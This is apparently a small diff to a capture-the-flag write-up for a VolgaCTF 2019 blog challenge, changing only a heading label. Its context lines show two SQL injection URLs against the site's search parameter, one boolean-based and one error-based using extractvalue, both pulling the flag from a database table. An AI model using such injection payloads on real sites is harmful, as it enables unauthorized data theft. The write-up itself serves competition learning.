@@ -22,7 +22,7 @@ add_filter( 'posts_where', 'cf_search_where' );
 http://blog.q.2019.volgactf.ru/?s=)))or(select`flag`from`flag`)like(0x566F6C67614354467B25)%23%27)&exact=1
 ```
 
-**Error Based:**
+**Error Based (LC↯BC):**
 
 ```
 http://blog.q.2019.volgactf.ru/?s=)))+union+select+extractvalue(1,concat(0x3a,(select+flag+from+flag)))+%23%27)&exact=1&sentence=1
